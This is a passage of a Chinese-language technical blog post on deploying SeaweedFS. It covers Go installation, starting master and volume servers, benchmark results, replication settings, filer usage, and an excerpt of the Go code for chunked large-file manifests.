volume会创建一个 datanode ，可以指定所属的 datacenter rack和master ，会根据配置存储文件，默认一开始没有volume，当开始存储文件的时候才会创建一个volume，当这一个volume大小超过了volumeSizeLimitMB 就会新增一个volume，当volume个数超过了max则该datanode就不能新增数据了。那就需要在通过weed volume命令新增一个datanode。</p><h2 id="搭建服务"><a href="#搭建服务" class="headerlink" title="搭建服务"></a>搭建服务</h2><h3 id="安装go环境"><a href="#安装go环境" class="headerlink" title="安装go环境"></a>安装go环境</h3><blockquote><ul><li>查看系统位数 getconf LONG_BIT</li><li>下载源码包</li><li>选择对应版本</li></ul></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local</span><br><span class="line"># 下载</span><br><span class="line">wget https:&#x2F;&#x2F;golangtc.com&#x2F;static&#x2F;go&#x2F;1.9.2&#x2F;go1.9.2.linux-amd64.tar.gz</span><br><span class="line"># 将其传到其他两台机器</span><br><span class="line"># 解压</span><br><span class="line">tar -zxf go1.9.2.linux-amd64.tar.gz</span><br><span class="line"># 配置</span><br><span class="line">vim &#x2F;etc&#x2F;profile</span><br><span class="line">#加入</span><br><span class="line">export GOPATH&#x3D;&#x2F;opt&#x2F;go</span><br><span class="line">export GOROOT&#x3D;&#x2F;usr&#x2F;local&#x2F;go</span><br><span class="line">export GOOS&#x3D;linux</span><br><span class="line">export GOBIN&#x3D;$GOROOT&#x2F;bin</span><br><span class="line">export GOTOOLS&#x3D;$GOROOT&#x2F;pkg&#x2F;tool&#x2F;</span><br><span class="line">export PATH&#x3D;$PATH:$GOBIN:$GOTOOLS</span><br><span class="line"></span><br><span class="line"># 使配置文件生效</span><br><span class="line">source &#x2F;etc&#x2F;profile</span><br><span class="line"></span><br><span class="line"># 查看</span><br><span class="line">go version</span><br></pre></td></tr></table></figure><h3 id="安装seaweedfs"><a href="#安装seaweedfs" class="headerlink" title="安装seaweedfs"></a>安装seaweedfs</h3><p>(1)下载 <a href="https://github.com/chrislusf/seaweedfs/releases/%E9%80%89%E6%8B%A9%E5%AF%B9%E5%BA%94%E7%9A%84%E7%89%88%E6%9C%AC">https://github.com/chrislusf/seaweedfs/releases/选择对应的版本</a></p><p>(2)解压 tar -zxf linux_amd64.tar.gz</p><p>(3)./weed -h 查看帮助创建运行需要的目录   </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/../data            </span><br><span class="line"> /../ vol/vol[1-3]    </span><br><span class="line"> /../logs</span><br></pre></td></tr></table></figure><p>(4)配置运行master(如单机删除defaultReplication)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./weed master -mdir=/../data -port=9333 -defaultReplication=&quot;001&quot; -ip=&quot;172.16.20.71&quot; &amp;&gt;&gt; /../logs/master.log &amp;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>(5) 配置运行volume</p><p>具体参数查看帮助<br>/usr/local/weed volume -h</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./weed volume -port=9331 -dir=vol/vol1/ -max=100 -mserver=&quot;192.168.6.224:9333&quot; -ip=&quot;192.168.6.224&quot; &amp;&gt;vol/vol1/vol1.log &amp;</span><br></pre></td></tr></table></figure><h2 id="单机基准测试-Benchmarks"><a href="#单机基准测试-Benchmarks" class="headerlink" title="单机基准测试(Benchmarks)"></a>单机基准测试(Benchmarks)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># prepare directories</span><br><span class="line">mkdir vol&#x2F;vol1 vol&#x2F;vol2 vol&#x2F;vol3</span><br><span class="line"># start 3 servers</span><br><span class="line">.&#x2F;weed server -dir&#x3D;.&#x2F;vol&#x2F;vol1 -master.port&#x3D;9333 -volume.port&#x3D;8083 &amp;</span><br><span class="line">.&#x2F;weed volume -dir&#x3D;.&#x2F;vol&#x2F;vol2 -port&#x3D;8084 &amp;</span><br><span class="line">.&#x2F;weed volume -dir&#x3D;.&#x2F;vol&#x2F;vol3 -port&#x3D;8085 &amp;</span><br><span class="line">.&#x2F;weed benchmark -master&#x3D;localhost:9333</span><br></pre></td></tr></table></figure><p>可以使用命令查看基准测试帮助信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;weed benchmark -h</span><br></pre></td></tr></table></figure><p>默认情况下weed的基准测试使用100万1KB file</p><p>机器配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Architecture:          x86_64</span><br><span class="line">CPU op-mode(s):        32-bit, 64-bit</span><br><span class="line">Byte Order:            Little Endian</span><br><span class="line">CPU(s):                8</span><br><span class="line">On-line CPU(s) list:   0-7</span><br><span class="line">Thread(s) per core:    1</span><br><span class="line">Core(s) per socket:    1</span><br><span class="line">CPU socket(s):         8</span><br><span class="line">NUMA node(s):          1</span><br><span class="line">Vendor ID:             GenuineIntel</span><br><span class="line">CPU family:            6</span><br><span class="line">Model:                 45</span><br><span class="line">Stepping:              7</span><br><span class="line">CPU MHz:               2400.000</span><br><span class="line">BogoMIPS:              4800.00</span><br><span class="line">Hypervisor vendor:     VMware</span><br><span class="line">Virtualization type:   full</span><br><span class="line">L1d cache:             32K</span><br><span class="line">L1i cache:             32K</span><br><span class="line">L2 cache:              256K</span><br><span class="line">L3 cache:              10240K</span><br><span class="line">NUMA node0 CPU(s):     0-7</span><br></pre></td></tr></table></figure><p>基准测试结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">Write 1 million 1KB file:</span><br><span class="line">Concurrency Level:      16</span><br><span class="line">Time taken for tests:   131.658 seconds</span><br><span class="line">Complete requests:      1048576</span><br><span class="line">Failed requests:        0</span><br><span class="line">Total transferred:      1106762855 bytes</span><br><span class="line">Requests per second:    7964.42 [#&#x2F;sec]</span><br><span class="line">Transfer rate:          8209.35 [Kbytes&#x2F;sec]</span><br><span class="line"></span><br><span class="line">Connection Times (ms)</span><br><span class="line">              min      avg        max      std</span><br><span class="line">Total:        0.4      1.9       338.9      2.8</span><br><span class="line"></span><br><span class="line">Percentage of the requests served within a certain time (ms)</span><br><span class="line">   50%      1.6 ms</span><br><span class="line">   66%      1.9 ms</span><br><span class="line">   75%      2.2 ms</span><br><span class="line">   80%      2.4 ms</span><br><span class="line">   90%      3.2 ms</span><br><span class="line">   95%      4.2 ms</span><br><span class="line">   98%      5.2 ms</span><br><span class="line">   99%      6.1 ms</span><br><span class="line">  100%    338.9 ms</span><br><span class="line">  </span><br><span class="line"> </span><br><span class="line">Randomly read 1 million files:</span><br><span class="line"></span><br><span class="line">Concurrency Level:      16</span><br><span class="line">Time taken for tests:   39.724 seconds</span><br><span class="line">Complete requests:      1048576</span><br><span class="line">Failed requests:        0</span><br><span class="line">Total transferred:      1106738848 bytes</span><br><span class="line">Requests per second:    26396.35 [#&#x2F;sec]</span><br><span class="line">Transfer rate:          27207.53 [Kbytes&#x2F;sec]</span><br><span class="line"></span><br><span class="line">Connection Times (ms)</span><br><span class="line">              min      avg        max      std</span><br><span class="line">Total:        0.1      0.5       64.5      0.7</span><br><span class="line"></span><br><span class="line">Percentage of the requests served within a certain time (ms)</span><br><span class="line">   50%      0.3 ms</span><br><span class="line">   66%      0.4 ms</span><br><span class="line">   75%      0.5 ms</span><br><span class="line">   80%      0.6 ms</span><br><span class="line">   90%      0.9 ms</span><br><span class="line">   95%      1.3 ms</span><br><span class="line">   98%      2.3 ms</span><br><span class="line">   99%      3.1 ms</span><br><span class="line">  100%     64.5 ms</span><br></pre></td></tr></table></figure><p>删除测试数据:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http:&#x2F;&#x2F;192.168.6.226:9333&#x2F;col&#x2F;delete?collection&#x3D;benchmark&amp;pretty&#x3D;y&quot;</span><br></pre></td></tr></table></figure><h2 id="启动服务的方式"><a href="#启动服务的方式" class="headerlink" title="启动服务的方式"></a>启动服务的方式</h2><blockquote><p>方式1</p><p>weed scaffold -config=filer -output=. 然后修改里面leveldb的目录</p><p>weed server -dir=./vtmp -master.port=9333 -master.dir=./mtmp -volume.max=5 -volume.port=9991 -filer -filer.port=8888 -master.volumeSizeLimitMB=10</p><p>-whiteList</p><p>-filer.dir 目录来存储元数据，默认为指定-dir的“filer”子目录</p><p>-master.volumeSizeLimitMB 默认最大30000000 （30G）</p><p>-master.dir用于存储元数据的数据目录，默认为与指定的-dir相同</p></blockquote><blockquote><p>方式2</p><p>weed master -port=9333 -mdir=./mtmp</p><p>weed volume -port=9991 -dir=./vtmp -max=100 -mserver=localhost:9333</p><p>weed scaffold -config=filer -output=.</p><p>weed filer -port=8888 -master=localhost:9333</p></blockquote><h2 id="volume的备份机制-Replication"><a href="#volume的备份机制-Replication" class="headerlink" title="volume的备份机制 Replication"></a>volume的备份机制 Replication</h2><p>默认000 不备份</p><p>defaultReplication</p><p>000 不备份， 只有一份数据</p><p>001 在相同的rackj里备份一份数据</p><p>010 在相同数据中心内不同的rack间备份一份数据</p><p>100 在不同的数据中心备份一份数据</p><p>200 在两个不同的数据中心各复制2次</p><p>110 在不同的rack备份一份数据， 在不同的数据中心备份一次</p><p>如果数据备份类型是 xyz形式</p><p>各自的意义</p><p>x 在别的数据中心备份的份数</p><p>y 不相同数据中心不同的racks备份的份数</p><p>z 在别的服务器相同的rack的备份份数</p><h2 id="filer的使用"><a href="#filer的使用" class="headerlink" title="filer的使用"></a>filer的使用</h2><p>首先，运行<strong>weed scaffold -config=filer</strong>生成filer.toml文件.</p><p>最简单的filer.toml可以是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[leveldb]</span><br><span class="line">enabled &#x3D; true</span><br><span class="line">dir &#x3D; &quot;.&quot;# directory to store level db files</span><br></pre></td></tr></table></figure><p><strong>启动filer功能</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># assuming you already started weed master and weed volume</span><br><span class="line">weed filer</span><br><span class="line"></span><br><span class="line"># Or assuming you have nothing started yet,</span><br><span class="line"># this command starts master server, volume server, and filer in one shot. </span><br><span class="line"># It&#39;s strictly the same as starting them separately</span><br><span class="line">weed server -filer&#x3D;true</span><br></pre></td></tr></table></figure><p><strong>增加/删除/查看文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># POST a file and read it back</span><br><span class="line">curl -F &quot;filename&#x3D;@README.md&quot; &quot;http:&#x2F;&#x2F;localhost:8888&#x2F;path&#x2F;to&#x2F;sources&#x2F;&quot;</span><br><span class="line">curl &quot;http:&#x2F;&#x2F;localhost:8888&#x2F;path&#x2F;to&#x2F;sources&#x2F;README.md&quot;</span><br><span class="line"></span><br><span class="line"># POST a file with a new name and read it back</span><br><span class="line">curl -F &quot;filename&#x3D;@Makefile&quot; &quot;http:&#x2F;&#x2F;localhost:8888&#x2F;path&#x2F;to&#x2F;sources&#x2F;new_name&quot;</span><br><span class="line">curl &quot;http:&#x2F;&#x2F;localhost:8888&#x2F;path&#x2F;to&#x2F;sources&#x2F;new_name&quot;</span><br><span class="line"></span><br><span class="line"># list sub folders and files</span><br><span class="line">visit &quot;http:&#x2F;&#x2F;localhost:8888&#x2F;path&#x2F;to&#x2F;sources&#x2F;&quot;</span><br><span class="line"></span><br><span class="line"># if lots of files under this folder, here is a way to efficiently paginate through all of them</span><br><span class="line">visit &quot;http:&#x2F;&#x2F;localhost:8888&#x2F;path&#x2F;to&#x2F;sources&#x2F;?lastFileName&#x3D;abc.txt&amp;limit&#x3D;50&quot;</span><br></pre></td></tr></table></figure><p>Filer有一个连接到Master的持久客户端，以获取所有卷的位置更新。没有网络往返来查找卷ID位置。</p><p>对于文件读取：</p><ol><li>文件管理器从Filer Store查找元数据，可以是Cassandra / Mysql / Postgres / Redis / LevelDB / etcd。</li></ol><ol start="2"><li>Filer从卷服务器读取并传递给读取请求。</li></ol><p>   <img src="/images/storage/FilerRead.png"></p><p>对于文件写入：</p><ol><li>客户端流文件到Filer</li></ol><ol start="2"><li>Filer将数据上传到Weed Volume Servers，并将大文件分成块。</li></ol><ol start="3"><li>Filer将元数据和块信息写入Filer存储区。</li></ol><h2 id="Filer-Store"><a href="#Filer-Store" class="headerlink" title="Filer Store"></a>Filer Store</h2><p><strong>复杂度</strong></p><blockquote><p>对于一个文件检索，（file_parent_directory，fileName）=&gt;元数据查找将是用于LSM树或Btree实现的O（logN），其中N是现有条目的数量，或者对于Redis是O（1）。</p><p>对于特定目录下的文件列表，列表只是对LSM树或Btree的简单扫描，或对于Redis的O（1）。</p><p>对于添加一个文件，如果不存在，将以递归方式创建父目录。然后将创建文件条目。</p><p>对于文件重命名，它只是O（1）操作，删除旧元数据并插入新元数据，而不更改卷服务器上的实际文件内容。</p><p>对于目录重命名，它将是O（N）操作，其中N是要重命名目录下的文件和文件夹的数量。这是因为他们每个人都需要调整元数据。但是，卷服务器上的实际文件内容仍然没有变化。</p></blockquote><p><strong>用例</strong></p><p>客户可以通过HTTP评估一个“weed filer”，列出目录下的文件，通过HTTP POST创建文件，直接通过HTTP POST读取文件。</p><p>虽然一个“weed filer”只能位于一台机器上，但您可以在多台机器上启动多个“weed filer”，每个“weed filer”实例在其自己的集合中运行，具有自己的命名空间，但共享相同的SeaweedFS存储。</p><p><strong>Filer线性可扩展</strong></p><p>Filer被设计为线性可伸缩的，并且仅受底层元数据存储的限制。</p><p><strong>Filer工作负载</strong></p><p>Filer有两个用例。</p><p>当filer直接用于上传和下载文件时，以及与“weed s3”一起使用时，文件管理器还需要在读取和写入期间处理文件内容以及元数据。所以添加多个文件服务器是个好主意。</p><p>当filer与“weed mount”一起使用时，filer仅提供文件元数据检索。实际文件内容直接在“weed mount”和“weed volume”服务器之间读写。所以文件管理器没有那么多。</p><h2 id="文件管理器命令和操作"><a href="#文件管理器命令和操作" class="headerlink" title="文件管理器命令和操作"></a>文件管理器命令和操作</h2><p><strong>复制到Filer</strong><br>weed filer.copy 可以将一个或一个文件或目录列表复制到文件管理器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; copy all go files under current directory to filer&#39;s &#x2F;github&#x2F; folder.</span><br><span class="line">&#x2F;&#x2F; The directory structure is copied also.</span><br><span class="line">&gt; weed filer.copy -include *.go . http:&#x2F;&#x2F;localhost:8888&#x2F;github&#x2F;</span><br><span class="line">...</span><br><span class="line">Copy .&#x2F;unmaintained&#x2F;change_replication&#x2F;change_replication.go &#x3D;&gt; http:&#x2F;&#x2F;localhost:8888&#x2F;github&#x2F;.&#x2F;unmaintained&#x2F;change_replication&#x2F;change_replication.go</span><br><span class="line">Copy .&#x2F;unmaintained&#x2F;fix_dat&#x2F;fix_dat.go &#x3D;&gt; http:&#x2F;&#x2F;localhost:8888&#x2F;github&#x2F;.&#x2F;unmaintained&#x2F;fix_dat&#x2F;fix_dat.go</span><br><span class="line">Copy .&#x2F;unmaintained&#x2F;see_idx&#x2F;see_idx.go &#x3D;&gt; http:&#x2F;&#x2F;localhost:8888&#x2F;github&#x2F;.&#x2F;unmaintained&#x2F;see_idx&#x2F;see_idx.go</span><br><span class="line">Copy .&#x2F;weed&#x2F;command&#x2F;backup.go &#x3D;&gt; http:&#x2F;&#x2F;localhost:8888&#x2F;github&#x2F;.&#x2F;weed&#x2F;command&#x2F;backup.go</span><br><span class="line">Copy .&#x2F;weed&#x2F;command&#x2F;benchmark.go &#x3D;&gt; http:&#x2F;&#x2F;localhost:8888&#x2F;github&#x2F;.&#x2F;weed&#x2F;command&#x2F;benchmark.go</span><br><span class="line">Copy .&#x2F;weed&#x2F;command&#x2F;command.go &#x3D;&gt; http:&#x2F;&#x2F;localhost:8888&#x2F;github&#x2F;.&#x2F;weed&#x2F;command&#x2F;command.go</span><br><span class="line">Copy .&#x2F;weed&#x2F;command&#x2F;compact.go &#x3D;&gt; http:&#x2F;&#x2F;localhost:8888&#x2F;github&#x2F;.&#x2F;weed&#x2F;command&#x2F;compact.go</span><br></pre></td></tr></table></figure><h2 id="大文件处理"><a href="#大文件处理" class="headerlink" title="大文件处理"></a>大文件处理</h2><p>为了实现高并发性，SeaweedFS尝试将整个文件读写并写入内存。但这对大文件不起作用。</p><p>以下是在“weed upload”命令中实现的。对于第三方客户，这是规范.</p><p>为了支持大文件，SeaweedFS支持以下两种文件：</p><blockquote><p>块文件。每个块文件实际上只是SeaweedFS的普通文件。<br>大块文件。一个简单的json文件，包含所有块的列表。</p></blockquote><p>这段代码显示了json文件结构：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line">package operation</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/json&quot;</span></span><br><span class="line"><span class="string">&quot;errors&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;sort&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;google.golang.org/grpc&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;sync&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/chrislusf/seaweedfs/weed/glog&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/chrislusf/seaweedfs/weed/util&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line"><span class="comment">// when the remote server does not allow range requests (Accept-Ranges was not set)</span></span><br><span class="line">ErrRangeRequestsNotSupported = errors.New(<span class="string">&quot;Range requests are not supported by the remote server&quot;</span>)</span><br><span class="line"><span class="comment">// ErrInvalidRange is returned by Read when trying to read past the end of the file</span></span><br><span class="line">ErrInvalidRange = errors.New(<span class="string">&quot;Invalid range&quot;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type ChunkInfo struct &#123;</span><br><span class="line">Fid    string <span class="string">`json:&quot;fid&quot;`</span></span><br><span class="line">Offset int64  <span class="string">`json:&quot;offset&quot;`</span></span><br><span class="line">Size   int64  <span class="string">`json:&quot;size&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type ChunkList []*ChunkInfo</span><br><span class="line"></span><br><span class="line">type ChunkManifest struct &#123;</span><br><span class="line">Name   string    <span class="string">`json:&quot;name,omitempty&quot;`</span></span><br><span class="line">Mime   string    <span class="string">`json:&quot;mime,omitempty&quot;`</span></span><br><span class="line">Size   int64     <span class="string">`json:&quot;size,omitempty&quot;`</span></span><br><span class="line">Chunks ChunkList <span class="string">`json:&quot;chunks,omitempty&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// seekable chunked file reader</span></span><br><span class="line">type ChunkedFileReader struct &#123;</span><br><span class="line">Manifest *ChunkManifest</span><br><span class="line">Master   string</span><br><span class="line">pos      int64</span><br><span class="line">pr       *io.PipeReader</span><br><span class="line">pw       *io.PipeWriter</span><br><span class="line">mutex    sync.Mutex</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (s ChunkList) Len() int           &#123; <span class="keyword">return</span> len(s) &#125;</span><br><span class="line">func (s ChunkList) Less(i, j int) bool &#123; <span class="keyword">return</span> s[i].Offset &lt; s[j].Offset &#125;</span><br><span class="line">func (s ChunkList) Swap(i, j int)      &#123; s[i], s[j] = s[j], s[i] &#125;</span><br><span class="line"></span><br><span class="line">func LoadChunkManifest(buffer []byte, isGzipped bool) (*ChunkManifest, error) &#123;</span><br><span class="line"><span class="keyword">if</span> isGzipped &#123;</span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line"><span class="keyword">if</span> buffer, err = util.UnGzipData(buffer); err != nil &#123;</span><br><span class="line"><span class="keyword">return</span> nil, err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cm := ChunkManifest&#123;&#125;</span><br><span class="line"><span class="keyword">if</span> e := json.Unmarshal(buffer, &amp;cm); e != nil &#123;</span><br><span class="line"><span class="keyword">return</span> nil, e</span><br><span class="line">&#125;</span><br><span class="line">sort.Sort(cm.Chunks)</span><br><span class="line"><span class="keyword">return</span> &amp;cm, nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (cm *ChunkManifest) Marshal() ([]byte, error) &#123;</span><br><span class="line"><span class="keyword">return</span> json.Marshal(cm)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (cm *ChunkManifest) DeleteChunks(master string, grpcDialOption grpc.DialOption) error &#123;</span><br><span class="line"><span class="keyword">var</span> fileIds []string</span><br><span class="line"><span class="keyword">for</span> _, <span class="attr">ci</span> := range cm.Chunks &#123;</span><br><span class="line">fileIds = append(fileIds, ci.Fid)</span><br><span class="line">&#125;</span><br><span class="line">results, <span class="attr">err</span> := DeleteFiles(master, grpcDialOption, fileIds)</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">glog.V(<span class="number">0</span>).Infof(<span class="string">&quot;delete %+v: %v&quot;</span>, fileIds, err)</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;chunk delete: %v&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, <span class="attr">result</span> := range results &#123;</span><br><span class="line"><span class="keyword">if</span> result.Error != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">glog.V(<span 